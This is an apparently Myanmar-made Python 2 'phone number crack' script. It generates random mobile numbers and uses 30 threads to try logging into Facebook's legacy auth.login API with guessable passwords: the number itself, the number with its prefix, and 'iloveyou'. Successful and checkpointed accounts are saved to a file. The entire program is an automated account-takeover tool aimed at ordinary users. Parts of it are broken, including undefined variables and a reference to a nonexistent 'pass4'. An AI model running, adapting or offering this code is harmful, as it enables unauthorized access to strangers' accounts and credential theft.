# Author : M4RMU
#!/usr/bin/python2
#coding=utf-8

import os
import sys
import time,datetime
import random
import hashlib,re
import threading
import json
import urllib
import cookielib
import getpass

os.system('rm -rf acc.txt')
for n in range(40000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pkg install toilet -y')
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 kyawgyi.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; moto e(7) Build/QOFS30.569-36-10; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/288.0.0.11.115;]')]

def htwat():
	print '\033[1;93mThanks Gong Gyi'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """ \033[1;96m
░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
░░░██░░░░░░░█░░█▄▄▄▄░▀▀██░░█░░░
░░░██░░░░░░░█░░▀████████░░█░░░░
░░█░░█░░░░░░░█░░▀▄▄▄▄██░░█░░░░░
░░█░░░█░░░░░░░█░░░░░░░░░█░░░░░░
░█░░░░░█░░░░░░░░░░░░░░░░█░░░░░░
░░░░░░░░█░░░░░░█░░░░░░░░█░░░░░░
░░░░░░░░░░░░░░░░████████░░░░░░░ 


█▄▀ █▄█ ▄▀█ █░█░█   █▀▀ █▄█ █
█░█ ░█░ █▀█ ▀▄▀▄▀   █▄█ ░█░ █
"""

####Design####

logo1 = """
\033[1;95m████████████████████████████████████
\033[1;96m█▄─▀█▀─▄██▀▄─██▄─▄▄▀█▄─▀█▀─▄█▄─██─▄█
\033[1;96m██─█▄█─███─▀─███─▄─▄██─█▄█─███─██─██
\033[1;94m▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▀▄▄▄▄▀▀ \033[1;91m
╒══════════════════⭐══════════════════╕
\033[1;97m    FACEBOOK   :\033[1;96m TECHNOLOGY BY M4RMU
 \033[1;97m    AUTHOR    :\033[1;96m M4RMU
 \033[1;97m    GITHUB    :\033[1;96m B4BY DR4G0N 
 \033[1;97m   TELEGRAM   :\033[1;96m TERMUX MY4NM4R TEAM　\033[1;91m
╘═══════════🍁═════════════🍁══════════╛
"""

logo2 = """
\033[1;93m ███╗░░░███╗░█████╗░██████╗░███╗░░░███╗██╗░░░██╗  \033[1;91mB
\033[1;93m ████╗░████║██╔══██╗██╔══██╗████╗░████║██║░░░██║  \033[1;91mA
\033[1;92m ██╔████╔██║███████║██████╔╝██╔████╔██║██║░░░██║  \033[1;91mB
\033[1;92m ██║╚██╔╝██║██╔══██║██╔══██╗██║╚██╔╝██║██║░░░██║  \033[1;91mY
\033[1;91m ██║░╚═╝░██║██║░░██║██║░░██║██║░╚═╝░██║╚██████╔╝  \033[1;92mD R A G O N
\033[1;91m ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░  
\033[1;92m →→→→→→→→→          New Version1.0　    ←←←←←←←←←←
\033[1;97m →→→→→→→→→　     Author: B4BY DR4G0N    ←←←←←←←←←←
\033[1;91m →→→→→→→→→   　    Creation: M4RMU      ←←←←←←←←←←
\033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
\033[1;94m---------------------------------------------------
"""

CorrectUsername = "BB"
CorrectPassword = "DG"

loop = 'true'
while (loop == 'true'):
    os.system('toilet -F metal M A R M U')
    os.system('toilet -f bubble PHONE NUMBER CRACK')
    print 50* '\033[1;94m-■'
    username = raw_input("\033[1;91m➣ \x1b[1;93mTOOL USERNAME \x1b[1;97m»» \x1b[1;97m ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;92m➣ \x1b[1;93mTOOL PASSWORD \x1b[1;97m»» \x1b[1;97m ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:THE YUNUS
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/marmu.007')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/marmu.007')



##### Kyawgyi #####

def kyawgyi():
    os.system('clear')
    login()

def login():
    os.system('clear')
    print logo1
    print "\033[1;93m[1] START THE TOOL "
    time.sleep(0.5)
    
    time.sleep(0.05)
    print '\x1b[1;91m[0] EXIT'
    kyawgyi_login()

def kyawgyi_login():
    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;96m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        print "\x1b[1;95mStupid !"
        kyawgyi_login()
    elif peak =="1":
        mamu()
def mamu():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1] START MYANMAR MOBILE NUMBER CRACKING'
    time.sleep(0.10)
    print '\x1b[1;91m[0] Back'
   
    time.sleep(0.05)
    thinzarwintkyaw()

def thinzarwintkyaw():
    peak = raw_input('\n\033[1;93m➣ \033[1;97mCHOOSE: ')
    if peak =='':
        print '[!] Fill In Correctly'
        thinzarwintkyaw()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "\033[1;91m➣ \033[1;97mEnter any Myanmar Mobile code Number"+'\n'
        print '\033[1;91m➣ \033[1;95mEXAMPLE'
        print '\033[1;93m[+] Mpt      :  20 21 22 23 25 24 26 23 43 42 44 45 46 47 28 91 88'   
        print '\033[1;93m[+] Telenor  :  70 71 72 73 74 75 76 77 78 79'     
        print '\033[1;92m[+] Mytel    :  69 68 67 66 65 64 63 62'                     
        print '\033[1;91m[+] Ooredoo  :  91 92 93 94 95 96 97 98 '        
        print '\033[1;91m[+] Other    :  84 88 48 47 77 66 85 86 87 89 51 50' 
        try:
            c = raw_input("\033[1;92m➣ \033[1;95mCHOOSE :CODE ")
            k="09"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            mamu()
    elif peak =='0':
        login()
    else:
        print '[!] Mhar P Gong Gyi'
        thinzarwintkyaw()
    print 50* '\033[1;94m-■'
    xxx = str(len(id))
    jalan ('\033[1;92m[+]\033[1;95m Total ids number: '+xxx)
    jalan ('\033[1;92m[+]\033[1;95m Code you choose: '+c)
    jalan ("\033[1;93m[+]\033[1;95m Wait A While Start Cracking...")
    jalan ("\033[1;92m[+]\033[1;95m If You Want To Stop Process => Press Ctrl+z")
    print 50* '\033[1;94m-■'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/Checkpoint.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/Checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Successfull] ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/Checkpoint.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/Checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="iloveyou"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass3
                                okb = open('save/Checkpoint.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                               if 'www.facebook.com' in q['error_msg']:
                                   print '\033[1;97m[Checkpoint] ' + k + c + user + '  |  ' + pass3
                                   cps = open('save/Checkpoint.txt', 'a')
                                   cps.write(k+c+user+pass3+'\n')
                                   cps.close()
                                   cpb.append(c+user+pass3)
                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                          
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m~'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cracking Accounts Has Been Saved : save/Checkpoint')
    jalan("Note : Your Checkpoint Accounts Will Open after  14 days")
    print ''
    print """ \033[1;95m

█▄▀ █▄█ ▄▀█ █░█░█   █▀▀ █▄█ █
█░█ ░█░ █▀█ ▀▄▀▄▀   █▄█ ░█░ █

═════════════════░▒░══════════════════
════════════▒▒▒▓███████████▓▒═══════════
════════▒██████████▓▓▓▓██▓████▓═════════
══════▒███████▓█▓▓▓█▓█▓███▓▓▓███════════
═════▓███▓██▓▓████▓██▓█▓▓▓███▓██▒═══════
═════▓██▓███▓█▓████████▓▓█████▓██═══════
═════▒█████████▓▓▓███████████████▒══════
═════▒██████▓█████▒▒▒▒▒██████████▒══════
═════▒███████▓█▓█▒═════░▒▓█▓▓▒▒██▒══════
═════▒█████████▓█▓░░▒▒░░░░░▒▒▒▒██▒══════
═════▒████████████▒░▒▒▒▒▒▒▒▒▒▒▒▓█▒══════
═════▒██████████▓▓▓▒▒▒▒▒▒▒▒▒▒▒░▓█▒══════
═════▒███████▓███▓▒▒▒▒▒▒▒▒▒▒▒▒░▒▓▒══════
═════▓█▒░░▓██▓█▓▒▒▒▒░░░░░░░░░░░▒█▒══════
═════▓█▒▒▒░▒███▒░░▒░░░▒▒▒▒▒█▓█████══════
═════██░▒██▒▒████▒░▓██████████████══════
═════▒█▒▒▒▓▒░▓█▓███████████▒▒█████══════
══════▒█═░░▒▒▒█▒▒▒▒█▓██████░═████═══════
═▒▓███▓██░░▒▒▒▒▒▒▒▒██████▓▒░░▒██▒═══════
██████████▓█▒▒▒▒▒▒▒▒█▓▒▒▒▒░░░═░█════════
█████████▓▓█▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓▓▒░▒█════════
██████████▒▒▓▓▒▒▒▒▒▒▒▒▒▒░▒▓██▓▒█════════
▓▓█▓████▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▓▒▒▒▓▓▓██═══════
██▓▒██▒░░▒▓▒▒▒▓█▓▒▒▒▒▒▒█████▒▒▓███══════
█▓▒█▓░░▒▒▒▒▒▒▒▒▒▓▓▒▒▓▒▒░░░▒▒▒▒█████═════
▓▓██░░▒▒▒▒▒▒▒▒▓▒▒▓▓▓▒▒▒▒▒▓██▓▓██████════
▓██▒░▒▒▒▒▒▒▒▒▒▓▓▓▓▓██▓▒▒▒░▒░▒█████▓██═══
▓▓█▒░▒▒▒▒▒▒▓▒▒▒▓▓██████▓▒▒▒▒█████▓▓██░══
█▓█▒░▒▒▒▒▒▒▒▒▒▓▓▓▓████████▓▒████▓██▓██══
▓██▒░▒░▒░░░▒▒▒▒▒▒▒▓▓████▓▒▒▒███▓▓█▓▓▓█══
▒██░░░░░░░░▒▒▒▒▒▒▒▓▓███▓▓▒▒██▓█▓█▓▒█▓██░
▒█▒═░░░░░▒▒░▒▒▒▒▒▒▒▒▒▒▒▓▒▒██▓▓▒█▒▒█▓▒▒▓█
▒█▓░░░░░░░▒▒░▒▒▒▒░░░░▒▒░░██▒▓▒▓▒▒█▓▒▒▒▒█
▒▒█▒═░░░░░░░░░░░░░░░▒░═▒█▒▒▓▒▓█▓▓▒▒▒▒▒▒▓
█▒█▒═░░░░░░░░░░░░░░▒═░██▒▒▒▓▓▒▒▓▒▒▒▒▒▓▒▓
▓▓▒█░░░░░░░░░░░░░░░═▒█▒▒██▓▒▒▓▒▒▒▒▒▓▓▓▒▓
▓█▒█▒═░░░░░░░░▒░░░═▒█▒▒▓▓▓▓▓▒▒▓▒▒▓▓▓▓▒▓▓
▓█▓▒▒═░░░░░▒░▒░░▒═▒█▒▓▓▓▓▓█▓▒▒█▓▒▓▓▓▒▓▓▒
▓▓█▓▒░░░░░░░▒▒▒▒═░█▓▓▓▓▓▓▓▓▓▓▒▓██▒▒▒▓▓█▓
▓▓▓▓█▒═░░░░▒▒▒▒═░▓▓▓▓▓▒▓███▒▓█▒▒▓█▓▒▒▒▒▒
▓▓▒▓█▓═░░▒▒░▒▒═░██▓▓▓▓▓████▒▓▓██▓▓██▓▓▓▓
▓▒▒▓▒█░░▒▒░▒░═▒█████████▓███▓▓▓▓▓▓▓▓████
▓█▓▓▓█▓═▒░▒░░██████████████▓████████████
▓█▓▓▓▒█░░▒═░██████▓█▓█▓█▓▓▓▒█▒▒▒▒▒██████
                                  
"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()
